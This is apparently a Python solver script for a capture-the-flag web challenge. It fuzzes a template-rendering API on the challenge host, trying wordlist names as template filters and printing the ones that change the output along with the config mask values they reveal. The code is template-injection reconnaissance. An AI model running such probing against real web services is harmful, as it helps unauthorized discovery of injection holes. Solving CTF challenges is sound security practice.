import requests, time, sys
B='http://vaultkeeper-752a3ad6a3c88e9b.challs.ctf.thefewchosen.com'
s=requests.Session()
def rt(tpl):
    for _ in range(3):
        try: return s.post(B+'/api/render_template.php', json={'template':tpl,'event':'maintenance.x'}, timeout=20).json().get('rendered')
        except Exception: time.sleep(1.0)
    return None
names=open(sys.argv[1]).read().split()
for f in names:
    t='[[node|%s]]'%f
    r=rt(t)
    if r is None: print('ERR',f); continue
    if r != t:
        print('HIT %-14s node->%r  mask->%r'%(f,r, rt('[[config.cap_mask|%s]]'%f)), flush=True)
    time.sleep(0.04)
print('batch done', flush=True)
